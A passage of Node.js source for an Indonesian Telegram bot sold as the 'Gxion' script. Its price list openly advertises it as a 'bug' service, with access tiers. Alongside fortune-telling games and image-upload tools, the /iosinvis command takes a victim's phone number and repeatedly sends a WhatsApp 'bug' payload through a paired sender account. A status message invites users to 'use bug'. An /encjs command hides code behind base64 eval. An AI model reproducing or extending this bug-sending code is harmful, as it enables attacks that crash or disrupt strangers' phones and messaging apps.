💰 Kekayaan: ${pick(kekayaan)}
❤️ Jodoh: ${pick(jodoh)}
🏠 Rumah: ${pick(rumah)}
🚗 Kendaraan: ${pick(kendaraan)}
🍀 Nasib: ${pick(nasib)}
━━━━━━━━━━━━━━━━━━━━━━
✨ Hasil ini hanya hiburan ya!
💪 Masa depan ada di tanganmu sendiri!
🔮 Ketik /cekmasadepan [nama] untuk coba lagi</blockquote>`;

  ctx.reply(pesan, { parse_mode: "HTML" });
});

bot.command("ramal", async (ctx) => {
  const args = ctx.message.text.split(" ");
  let nama = "Kamu";
  if (args.length > 1) nama = args.slice(1).join(" ");

  const hasil = ["Sukses besar di usia 30an! 🎉", "Jadi pengusaha terkenal! 🏢", "Punya pasangan idaman! ❤️", "Hidup bahagia sampai tua! 😊", "Bisa beli rumah mewah! 🏰", "Keliling dunia bareng keluarga! 🌍", "Jadi orang yang bermanfaat! ✨"];
  const random = hasil[Math.floor(Math.random() * hasil.length)];
  ctx.reply(`🔮 *Ramalan untuk ${nama}:*\n\n✨ ${random}\n\n🔮 *Ketik /ramal [nama] lagi!*`, { parse_mode: "HTML" });
});

bot.command("convert", checkAllPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));
    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status ? `❌ Error ${e.response.status} saat unggah ke catbox` : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("cuaca", async (ctx) => {
  const kondisi = ["Cerah ☀️", "Berawan 🌥️", "Hujan Ringan 🌦️", "Hujan Lebat 🌧️", "Badai ⛈️", "Mendung 🌫️", "Panas Terik 🔥", "Dingin 🥶"];
  const suhu = Math.floor(Math.random() * 20) + 20;
  const kelembaban = Math.floor(Math.random() * 50) + 40;
  const randomKondisi = kondisi[Math.floor(Math.random() * kondisi.length)];

  ctx.reply(`<blockquote>
🌤️ PRAKIRAAN CUACA*l 🌤️
📌 Kondisi: ${randomKondisi}
🌡️ Suhu: ${suhu}°C
💧 Kelembaban: ${kelembaban}%
💨 Angin: ${Math.floor(Math.random() * 20) + 5} km/jam
✨ Perkiraan ini hanya hiburan ya!
🔮 Cuaca sebenarnya bisa berbeda</blockquote>`, { parse_mode: "HTML" });
});

bot.command("catboxurl", async (ctx) => {
  if (!ctx.message.reply_to_message) {
    return ctx.reply(`📸 UPLOAD GAMBAR 📸\n\nCara pakai:\n1. Kirim foto\n2. Reply foto itu\n3. Ketik /catboxurl\n\n✅ Gratis, cepat, permanen!`, { parse_mode: "Markdown" });
  }

  let fileId = null;
  let replied = ctx.message.reply_to_message;

  if (replied.photo) {
    fileId = replied.photo[replied.photo.length - 1].file_id;
  } else if (replied.document && replied.document.mime_type?.startsWith('image/')) {
    fileId = replied.document.file_id;
  } else {
    return ctx.reply("❌ Harus berupa foto!", { parse_mode: "Markdown" });
  }

  await ctx.reply("⏳ *Mengupload...*", { parse_mode: "Markdown" });

  try {
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const postData = JSON.stringify([{ url: fileUrl }]);

    const options = {
      hostname: 'telegra.ph',
      path: '/upload',
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
    };

    const request = https.request(options, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          if (result[0] && result[0].src) {
            ctx.reply(`✅ Upload Berhasil! ✅\n\n🔗 Link: https://telegra.ph${result[0].src}\n\n📌 Klik link untuk lihat gambar\n💾 Link permanent!`, { parse_mode: "Markdown" });
          } else {
            ctx.reply("❌ Gagal upload! Coba lagi.", { parse_mode: "Markdown" });
          }
        } catch {
          ctx.reply("❌ Error parsing response!", { parse_mode: "Markdown" });
        }
      });
    });

    request.write(postData);
    request.end();
  } catch {
    ctx.reply("❌ Terjadi kesalahan!", { parse_mode: "Markdown" });
  }
});

function simpleEncode(code) {
  let encoded = Buffer.from(code).toString('base64');
  return `eval(Buffer.from('${encoded}', 'base64').toString())`;
}

function simpleDecode(encrypted) {
  try {
    let match = encrypted.match(/Buffer\.from\('(.*?)',\s*'base64'\)/);
    if (match) return Buffer.from(match[1], 'base64').toString();
    return null;
  } catch {
    return null;
  }
}

bot.command("encjs", (ctx) => {
  let code = "";

  if (ctx.message.reply_to_message) {
    let replied = ctx.message.reply_to_message;
    if (replied.text) code = replied.text;
    else if (replied.caption) code = replied.caption;
  }

  if (!code) {
    let args = ctx.message.text.split(" ");
    args.shift();
    code = args.join(" ");
  }

  if (!code.trim()) {
    return ctx.reply(`🔒 *ENKRIPSI KODE JS* 🔒\n\n📌 *Cara pakai:*\n• /encjs console.log("Halo")\n• Atau *reply* pesan yang berisi kode, lalu ketik /encjs\n\n✅ *Contoh:*\n[Kamu kirim pesan: console.log("test")]\n[Lalu reply pesan itu dengan /encjs]`, { parse_mode: "Markdown" });
  }

  let hasil = simpleEncode(code);

  ctx.reply(`🔐 *KODE TERPROTEKSI* 🔐\n\n\`\`\`javascript\n${hasil}\n\`\`\`\n\n📌 *Simpan kode asli!*`, { parse_mode: "Markdown" });
});

bot.command("decjs", (ctx) => {
  let encrypted = "";

  if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
    encrypted = ctx.message.reply_to_message.text;
  } else {
    let args = ctx.message.text.split(" ");
    args.shift();
    encrypted = args.join(" ");
  }

  if (!encrypted.trim()) {
    return ctx.reply(`🔓 *DEKRIPSI KODE JS* 🔓\n\n📌 *Cara pakai:*\nReply pesan yang berisi kode terenkripsi, lalu ketik /decjs`, { parse_mode: "Markdown" });
  }

  let hasil = simpleDecode(encrypted);

  if (hasil) {
    ctx.reply(`🔓 *KODE ASLI* 🔓\n\n\`\`\`javascript\n${hasil}\n\`\`\``, { parse_mode: "Markdown" });
  } else {
    ctx.reply("❌ Gagal mendekripsi! Pastikan formatnya benar.", { parse_mode: "Markdown" });
  }
});

bot.command("pricescript", async (ctx) => {
  await ctx.reply(
`<blockquote>
┏━━〔 📜 KEUNGGULAN SCRIPT GXION 〕━━⬣
┣ ⿻ Selalu Update Ke Versi Yang Stabil ✅
┣ ⿻ Cocok Untuk Murbug X Pribadi ✅
┣ ⿻ Menggunakan Fitur Auto-Update ✅
┣ ⿻ Cocok untuk Push Channel Anda ✅
┣ ⿻ High Quality Script ✅
┗━━━━━━━━━━━━━━━━⬣
</blockquote>

<b>「 LIST PRICE SCRIPT GXION 」</b>
<blockquote>
⿻ FULL UPDATE SCRIPT ACCESS
┗ Rp 20.000 / 20K

⿻ RESELLER SCRIPT ACCESS
┗ Rp 30.000 / 30k

⿻ PARTNER SCRIPT ACCESS 
┗ Rp 55.000 / 55K

⿻ MODERATOR SCRIPT ACCESS
┗ Rp 70.000 / 70K

⿻ CEO SCRIPT ACCESS
┗ Rp 90.000 / 90K

⿻ OWNER SCRIPT ACCESS
┗ Rp 110.000 / 110K
</blockquote>

<b>「 BENEFIT SETIAP ROLES / ACCESS 」</b> 
<blockquote>
<b>⿻ BENEFIT ACCESS FULL UPDATE :</b>
┣ Masuk Group Utama Gxion
┗ Mendapatkan Script Gxion Auto - Update

<b>⿻ BENEFIT ACCESS RESELLER :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS PARTNER :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS MODERATOR :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┣ Bisa Menjual Access Partner
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS CEO  :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┣ Bisa Menjual Access Partner
┣ Bisa Menjual Access Moderator
┗ Bisa Add Token Sendiri 

<b>⿻ BENEFIT ACCESS OWNER  :</b>
┣ Masuk Group Utama Gxion
┣ Mendapatkan Script Gxion Auto - Update
┣ Bisa Menjual Access Full Updates
┣ Bisa Menjual Access Reseller
┣ Bisa Menjual Access Partner
┣ Bisa Menjual Access Moderator
┣ Bisa Menjual Access Ceo
┗ Bisa Add Token Sendiri 
</blockquote>
<blockquote>
<i>Berminat untuk membeli sebuah script Gxion ini Silahkan anda bisa menghubungi Admin terdekat yang menjualnya atau Hubungi Developer script secara langsung Yang ber Username [ @Bawzzhhh ]</i>
</blockquote>`,
    { parse_mode: "HTML" }
  );
});

bot.command('harga', async (ctx) => {
  try {
    const teks = `\`\`\`js
╔══════════════════════════╗
║      🪧 HARGA GXION SCRIPT   ║
╠══════════════════════════╣
║  ⛧ Full Up     : 20K     ║
║  ⛧ Reseller    : 30K     ║
║  ⛧ Partner     : 55K     ║
║  ⛧ Moderator   : 70K     ║
║  ⛧ CEO         : 90K     ║
║  ⛧ Owner       : 110K    ║
╠══════════════════════════╣
║   ⚡ SCRIPT BUG VIA TELEGRAM  ║
╚══════════════════════════╝
\`\`\``;

    await ctx.reply(teks, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "👑 Contact Owner", url: "https://t.me/Bawzhhh", style: "danger" }]
        ]
      }
    });

  } catch (err) {
    ctx.reply('Gagal menampilkan Bagian daftar /harga Di Karenakan Masalah Tertentu.');
  }
});

bot.command("cekfunction", async (ctx) => {
  try {
    if (!ctx.message.reply_to_message) return ctx.reply("Reply function JavaScript yang ingin dicek.");

    const text = ctx.message.reply_to_message.text || ctx.message.reply_to_message.caption;
    if (!text) return ctx.reply("Pesan yang direply tidak berisi kode.");

    let acorn;
    try {
      acorn = require("acorn");
    } catch {
      return ctx.reply("Module acorn belum terinstall.\nInstall: npm install acorn");
    }

    try {
      acorn.parse(text, { ecmaVersion: "latest", sourceType: "module", locations: true });
      return ctx.reply(`🔎 Mengecek syntax function...\n\n✅ SYNTAX VALID\nTidak ditemukan error.\n\n© Gxion`);
    } catch (err) {
      const lines = text.split("\n");
      const line = err.loc?.line || 0;
      const column = err.loc?.column || 0;
      const start = Math.max(0, line - 3);
      const end = Math.min(lines.length, line + 2);

      const snippet = lines.slice(start, end).map((l, i) => {
        const num = start + i + 1;
        return num === line ? `👉 ${num} | ${l}` : `   ${num} | ${l}`;
      }).join("\n");

      return ctx.reply(`❌ ERROR TERDETEKSI\n\n${err.message}\nLine ${line}:${column}\n\n📌 CUPlikan:\n\`\`\`javascript\n${snippet}\n\`\`\`\n\n© Gxion`);
    }
  } catch (e) {
    ctx.reply("Terjadi error saat mengecek function.");
  }
});

const DB_FILE = "./DbCmd.json";

function loadDB() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify({ disabled: [], lockAllCmd: false }, null, 2));
  }
  return JSON.parse(fs.readFileSync(DB_FILE));
}

function saveDB(db) {
  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

let db = loadDB();

function extractCommand(text) {
  if (!text || !text.startsWith("/")) return null;
  let cmd = text.split(" ")[0].replace("/", "").toLowerCase();
  if (cmd.includes("@")) cmd = cmd.split("@")[0];
  cmd = cmd.replace(/[^a-zA-Z0-9_]/g, "");
  return cmd;
}

bot.command("offcmd", checkOwner, async (ctx) => {
  let args = ctx.message.text.trim().split(/\s+/);
  if (!args[1]) return ctx.reply("🪧 Example : /offcmd menu Atau /offcmd /menu");

  let cmd = args[1].toLowerCase().replace("/", "").replace("@", "").replace(/[^a-zA-Z0-9_]/g, "");
  if (db.disabled.includes(cmd)) return ctx.reply("udah OFF");

  db.disabled.push(cmd);
  saveDB(db);
  return ctx.reply("/" + cmd + " ⚠️ Berhasil di nonaktifkan dan user tidak bisa memakainya lagi");
});

bot.command("oncmd", checkOwner, async (ctx) => {
  let args = ctx.message.text.trim().split(/\s+/);
  if (!args[1]) return ctx.reply("🪧 Example : /oncmd menu Atau /oncmd /menu");
  
  let cmd = args[1].toLowerCase().replace("/", "").replace("@", "").replace(/[^a-zA-Z0-9_]/g, "");
  let index = db.disabled.indexOf(cmd);
  if (index === -1) return ctx.reply("Sudah aktif dongo");

  db.disabled.splice(index, 1);
  saveDB(db);
  return ctx.reply("/" + cmd + " Berhasil di aktifkan kembali 💎");
});

bot.command("offcmdlist", checkOwner, async (ctx) => {
  if (db.disabled.length === 0) return ctx.reply("semua command aktif");

  let list = "";
  for (let i = 0; i < db.disabled.length; i++) {
    list += (i + 1) + ". /" + db.disabled[i] + "\n";
  }
  return ctx.reply("⚠️ DAFTAR CMD YANG DI NONAKTIF OLEH OWNER:\n" + list);
});

bot.command("lockallcmd", checkOwner, async (ctx) => {
  if (db.lockAllCmd) return ctx.reply("udah ke-lock");
  db.lockAllCmd = true;
  saveDB(db);
  return ctx.reply("❌ Semua command yang ada pada script berhasil di Nonaktifkan semua secara Otomatis");
});

bot.command("unlockallcmd", checkOwner, async (ctx) => {
  if (!db.lockAllCmd) return ctx.reply("udah kebuka");
  db.lockAllCmd = false;
  saveDB(db);
  return ctx.reply("Selamat !!! Semua command telah di aktifkan dan di buka secara luas kembali !");
});

bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  let cmd = extractCommand(ctx.message.text);
  if (!cmd) return next();

  if (cmd === "lockallcmd" || cmd === "unlockallcmd" || cmd === "offcmd" || cmd === "oncmd" || cmd === "offcmdlist") return next();

  if (db.lockAllCmd) return ctx.reply("🔒 Semua command telah di nonaktifkan semua oleh Owner, Hubungi mereka untuk membuka kembali");
  return next();
});

bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  let cmd = extractCommand(ctx.message.text);
  if (!cmd) return next();

  if (db.disabled.includes(cmd)) return ctx.reply("⛔ /" + cmd + " ⚠️ Command ini sedang di nonaktifkan oleh Owner, Silahkan hubungi mereka agar di Aktifkan kembali !!!");
  return next();
});

bot.command("removebg", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("📸 *Silakan reply foto yang ingin dihapus background-nya.*", { parse_mode: "Markdown" });
  }

  try {
    await ctx.reply("⏳ Sedang menghapus background...");

    const photo = ctx.message.reply_to_message.photo[ctx.message.reply_to_message.photo.length - 1];
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

    const imageResponse = await axios.get(fileLink.href, { responseType: "arraybuffer" });

    const formData = new FormData();
    formData.append("size", "auto");
    formData.append("image_file", Buffer.from(imageResponse.data), "image.jpg");

    const response = await axios.post("https://api.remove.bg/v1.0/removebg", formData, {
      headers: { ...formData.getHeaders(), "X-Api-Key": REMOVE_BG_KEY },
      responseType: "arraybuffer"
    });

    const filePath = `./removebg_${ctx.chat.id}.png`;
    fs.writeFileSync(filePath, response.data);
    await ctx.replyWithPhoto({ source: filePath }, { caption: "☘️ Background berhasil dihapus!" });
    fs.unlinkSync(filePath);

  } catch (error) {
    ctx.reply(`❌ Gagal remove background:\n${error.response?.data?.toString() || error.message}`);
  }
});

bot.command("jodoh", (ctx) => {
  const persen = Math.floor(Math.random() * 100) + 1;
  const status = persen > 70 ? "Cocok banget! 💖" : (persen > 40 ? "Bisa jadi 😊" : "Kurang cocok 😅");
  ctx.reply(`💘 *Cek Jodoh*\nKecocokan: ${persen}%\nStatus: ${status}`, { parse_mode: "Markdown" });
});

bot.command("shio", (ctx) => {
  const ramalan = ["Hoki besar 🍀", "Lumayan beruntung ✨", "Biasa aja 😶", "Kurang bagus 😕", "Sial dikit 🤣"];
  const random = ramalan[Math.floor(Math.random() * ramalan.length)];
  ctx.reply(`🐉 *Ramalan Shio hari ini:* ${random}`, { parse_mode: "Markdown" });
});

let tebakAngka = {};

bot.command("tebak", (ctx) => {
  const userId = ctx.from.id;
  if (!tebakAngka[userId]) {
    tebakAngka[userId] = Math.floor(Math.random() * 10) + 1;
    return ctx.reply("🎲 *Tebak Angka (1-10)*\nKetik /tebak [angka]\nContoh: /tebak 5", { parse_mode: "Markdown" });
  }
  const args = ctx.message.text.split(" ");
  const tebakan = parseInt(args[1]);
  if (isNaN(tebakan)) return ctx.reply("Masukkan angka 1-10!");
  if (tebakan === tebakAngka[userId]) {
    ctx.reply("🎉 *Benar!* Selamat! 🎉\nKetik /tebak lagi untuk main baru.");
    delete tebakAngka[userId];
  } else {
    ctx.reply(`❌ Salah! Angka rahasianya bukan ${tebakan}. Coba lagi.`);
  }
});

bot.command("motivasi", (ctx) => {
  const quotes = ["✨ Jangan menyerah, hari ini berat besok mungkin indah.", "💪 Sukses dimulai dari keberanian untuk memulai.", "🌟 Percaya sama diri sendiri, itu kunci utama.", "🌱 Proses tidak akan mengkhianati hasil.", "🚀 Bermimpilah tinggi, lalu kejar!"];
  const random = quotes[Math.floor(Math.random() * quotes.length)];
  ctx.reply(`💡 *Motivasi:* ${random}`, { parse_mode: "Markdown" });
});

bot.command("suit", (ctx) => {
  const pilihan = ["batu", "gunting", "kertas"];
  const user = ctx.message.text.split(" ")[1]?.toLowerCase();
  if (!user || !pilihan.includes(user)) return ctx.reply("Pilih: /suit batu | gunting | kertas");
  const botChoice = pilihan[Math.floor(Math.random() * 3)];
  let hasil = "";
  if (user === botChoice) hasil = "Seri 🤝";
  else if ((user === "batu" && botChoice === "gunting") || (user === "gunting" && botChoice === "kertas") || (user === "kertas" && botChoice === "batu")) hasil = "Kamu menang! 🎉";
  else hasil = "Bot menang! 😭";
  ctx.reply(`✊ Kamu: ${user}\n🤖 Bot: ${botChoice}\n${hasil}`);
});

bot.command("kepribadian", (ctx) => {
  const sifat = ["Pemberani 🦁", "Pintar 🧠", "Baik hati 💖", "Lucu 😂", "Penyabar 🧘", "Kreatif 🎨"];
  const random = sifat[Math.floor(Math.random() * sifat.length)];
  ctx.reply(`🧠 *Kepribadianmu:* ${random}`, { parse_mode: "Markdown" });
});

bot.command("karir", (ctx) => {
  const karir = ["Programmer 💻", "Pengusaha 🏢", "Dokter 🩺", "Guru 📚", "Artis 🎬", "Atlet ⚽"];
  const random = karir[Math.floor(Math.random() * karir.length)];
  ctx.reply(`💼 *Karir masa depanmu:* ${random}`, { parse_mode: "Markdown" });
});

bot.command("level", (ctx) => {
  const level = Math.floor(Math.random() * 100) + 1;
  let status = level > 80 ? "Level Dewa/ Dewi 😎" : (level > 50 ? "Cukup menawan 😊" : "Biasa saja 🤭");
  ctx.reply(`📊 *Level ketampanan/kecantikan:* ${level}%\n${status}`, { parse_mode: "Markdown" });
});

bot.command("harilahir", (ctx) => {
  const hari = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"];
  const random = hari[Math.floor(Math.random() * hari.length)];
  ctx.reply(`🎂 *Hari lahir versi random:* Kamu lahir hari ${random}. (Hanya hiburan)`, { parse_mode: "Markdown" });
});

bot.command("koin", (ctx) => {
  const hasil = Math.random() < 0.5 ? "Kepala 🪙" : "Ekor 💰";
  ctx.reply(`🪙 *Hasil lempar koin:* ${hasil}`, { parse_mode: "Markdown" });
});

bot.command("lagu", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) return ctx.reply("🎵 Cara pakai: /lagu [judul lagu]\nContoh: /lagu blur song 2", { parse_mode: "Markdown" });

  const status = await ctx.reply(`🔍 *Mencari: ${query}`, { parse_mode: "Markdown" });

  try {
    const res = await fetch(`https://api.deezer.com/search?q=${encodeURIComponent(query)}&limit=1`);
    const data = await res.json();

    if (!data.data || data.data.length === 0) {
      return ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, `❌ Lagu "${query}" tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const track = data.data[0];
    const judul = track.title;
    const artis = track.artist.name;
    const preview = track.preview;
    const cover = track.album.cover_medium;
    const link = track.link;

    await ctx.telegram.deleteMessage(ctx.chat.id, status.message_id).catch(() => {});

    if (cover) {
      await ctx.replyWithPhoto(cover, { caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, parse_mode: "Markdown" });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, { title: judul, performer: artis, caption: "🎧 *Preview 30 detik*" });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});

bot.command("hd", async (ctx) => {
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`);
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean");
    form.append("scale_factor", "4");

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", { method: "POST", body: form });
    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, { caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*" });
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, null, "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti.");
  }
});

bot.command("addbot", checkOwner, async (ctx) => {
  try {
    if (!state.sock) return ctx.reply("⛔ Socket belum siap. Silahkan ketik /killsesi lalu setelah itu melakukan /addbot kembali.");
    if (state.isWhatsAppConnected && state.sock.user) return ctx.reply("✅ WhatsApp sudah ter-connect.");
    if (state.pairingMessage) return ctx.reply("➕ Pairing masih aktif, tunggu dulu.");

    const args = ctx.message.text.split(" ");
    if (args.length < 2) return ctx.reply("🪧 Format: /addbot 628xxxx [ Menggunakan nomor aktif dan terdaftar pada Whatsapp ]");

    let phoneNumber = args[1].replace(/\D/g, "");
    if (phoneNumber.startsWith("08")) phoneNumber = "62" + phoneNumber.slice(1);
    if (phoneNumber.startsWith("00")) phoneNumber = phoneNumber.slice(2);

    if (phoneNumber.length < 8 || phoneNumber.length > 15) return ctx.reply("⛔ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/addbot 628xxxx");

    await new Promise(r => setTimeout(r, 1000));
    const code = await state.sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("⛔ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.reply(
`<blockquote><b><tg-emoji emoji-id="4958610528588008305">🎉</tg-emoji> 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 𝗖𝗢𝗗𝗘 𝗣𝗔𝗜𝗥𝗜𝗡𝗚</b></blockquote>
↯ 𝙽𝙾𝙼𝙾𝚁 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 : ${phoneNumber}
↯ 𝙲𝙾𝙳𝙴 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 : <code>${formattedCode}</code>
↯ 𝚂𝚃𝙰𝚃𝚄𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 : <tg-emoji emoji-id="6097966598033772797">♻️</tg-emoji> Loading....`,
      { parse_mode: "HTML" }
    );

    state.pairingMessage = { chatId: msg.chat.id, messageId: msg.message_id };

    setTimeout(() => { state.pairingMessage = null; }, 60000);

  } catch (err) {
    state.pairingMessage = null;
    return ctx.reply("⛔ Gagal pairing, Coba lakukan /killsesi, setelah itu /addbot kembali!");
  }
});

bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (state.sock) {
      try { await state.sock.logout(); } catch {}
      state.sock = null;
    }

    deleteSession();
    state.pairingMessage = null;

    await ctx.reply(`✅ ☇ Session akan dihapus, panel akan restart...`);

    setTimeout(() => { process.exit(0); }, 2000);

  } catch (err) {
    ctx.reply(`⛔ RESET SESSION FAILED\n━━━━━━━━━━━━━━━━━━\n${err.message}\n━━━━━━━━━━━━━━━━━━`);
  }
});

// ============= CASE BUG 1 BEBAS SPAM =============
bot.command("iosinvis", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /iosinvis 62xxxx\n\nContoh: /iosinvis 628123456789`);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await ctx.reply(`✅ iosinvis (bug) dikirim ke ${q}`);

  (async () => {
    try {
      for (let i = 0; i < 5; i++) {
        await firdauskece(state.sock, target);
      }
    } catch (error) {
      console.log(chalk.red(`❌ Error: ${error.message}`));
    }
  })();
});

bot.command("cekwa", checkOwner, async (ctx) => {
  try {
    const connected = state.isWhatsAppConnected && state.sock && state.sock.user;
    const status = connected ? "🟢 CONNECTED" : "🔴 DISCONNECTED";
    const number = connected ? state.sock.user.id.split(":")[0] : "-";
    const maskedNumber = connected ? number.slice(0, 5) + "••••••" + number.slice(-2) : "-";

    let country = "-";
    if (connected) {
      if (number.startsWith("62")) country = "🇮🇩 Indonesia";
      else if (number.startsWith("60")) country = "🇲🇾 Malaysia";
      else if (number.startsWith("65")) country = "🇸🇬 Singapore";
      else if (number.startsWith("1"))  country = "🇺🇸 USA/Canada";
      else if (number.startsWith("44")) country = "🇬🇧 United Kingdom";
      else if (number.startsWith("91")) country = "🇮🇳 India";
      else country = "🌍 International";
    }

    const uptime = process.uptime();
    const d = Math.floor(uptime / 86400);
    const h = Math.floor((uptime % 86400) / 3600);
    const m = Math.floor((uptime % 3600) / 60);
    const s = Math.floor(uptime % 60);

    const memUsed = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
    const memTotal = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const memFree = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);

    const cpuLoad = os.loadavg()[0].toFixed(2);
    const platform = os.platform();
    const nodeVer = process.version;

    const activeSessions = connected ? 1 : 0;

    const botUptime = runtime(process.uptime());

    const now = new Date().toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      hour12: false
    });

    await ctx.replyWithHTML(`
<blockquote><b>WHATSAPP CONNECTION STATUS</b></blockquote>
<b>Status</b> - <code>${status}</code>
<b>Number</b> - <code>${maskedNumber}</code>
<b>Country</b> - <code>${country}</code>
<b>Runtime</b> - <code>${d}D ${h}H ${m}M ${s}S</code>

<blockquote><b>SYSTEM INFO</b></blockquote>
<b>Platform</b> - <code>${platform}</code>
<b>Node.js</b> - <code>${nodeVer}</code>
<b>CPU Load</b> - <code>${cpuLoad}</code>
<b>RAM Used</b> - <code>${memUsed} MB</code>
<b>RAM Total</b> - <code>${memTotal} GB</code>
<b>RAM Free</b> - <code>${memFree} GB</code>
<b>Sender Aktif</b> - <code>${activeSessions}</code>

<blockquote><b>DETAIL</b></blockquote>
<b>Checked By</b> - <code>@${ctx.from.username || ctx.from.first_name || "Owner"}</code>
<b>Waktu</b> - <code>${now}</code>
<b>Total Uptime</b> - <code>${botUptime}</code>

<blockquote><i>${connected
  ? "Sender sudah terhubung, silahkan gunakan bug."
  : "Connection closed: Tidak ada sender aktif.\nGunakan /addbot 62xxxx untuk menautkan sender kembali."
}</i></blockquote>
`);
  } catch (err) {
    console.log("cekwa error:", err.message);
    ctx.reply("⛔ Failed to check bot status.");
  }
});
// ============================================
const userQueues = new Map();

function getUserQueue(userId) {
    if (!userQueues.has(userId)) {
        userQueues.set(userId, {
            queue: [],
            isProcessing: false,
            current: null
        });
    }
    return userQueues.get(userId);
}

function formatTime(seconds) {
    if (seconds < 60) return `${seconds}s`;
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}m ${s}s`;
}

async function processUserQueue(userId) {
    const userQueue = getUserQueue(userId);

    if (userQueue.isProcessing) return;
